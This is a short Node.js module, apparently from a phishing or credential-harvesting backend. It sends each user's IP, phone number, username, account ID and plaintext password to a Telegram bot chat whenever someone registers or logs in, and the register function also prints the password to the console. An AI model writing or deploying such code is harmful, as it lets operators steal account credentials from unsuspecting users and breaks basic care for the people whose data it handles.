const axios = require('axios');

async function sendRegisterAccountToBot(cellPhone, accountID, nickName, userIp, timeNow, password) {
    console.log(timeNow, password);
    const message = `K1 ĐĂNG KÝ
IP: ${userIp}
Thời Gian: ${timeNow}
Số Điện Thoại: ${cellPhone}
Tên Người Dùng: ${nickName}
Tên Đăng Nhập: ${accountID}
Mật Khẩu: ${password}`;
    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;
    try {
        const response = await axios.post(url, {
            chat_id: process.env.CHAT_ID,
            text: message
        });

        if (response.data.ok) {
            console.log('Message sent successfully:');
        } else {
            console.error('Failed to send message:', response.data);
        }
    } catch (error) {
        console.error('Error sending message:', error);
    }
}

async function sendLoginAccountToBot(userIp, timeNow, cellPhone, nickName, password) {
    const message = `K2 ĐĂNG NHẬP
IP: ${userIp}
Thời Gian: ${timeNow}
Số Điện Thoại: ${cellPhone}
Tên Tài Khoản: ${nickName}
Mật Khẩu: ${password}`;
    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;
    try {
        const response = await axios.post(url, {
            chat_id: process.env.CHAT_ID,
            text: message
        });

        if (response.data.ok) {
            console.log('Message sent successfully:');
        } else {
            console.error('Failed to send message:', response.data);
        }
    } catch (error) {
        console.error('Error sending message:', error);
    }
}

module.exports = { sendRegisterAccountToBot, sendLoginAccountToBot };
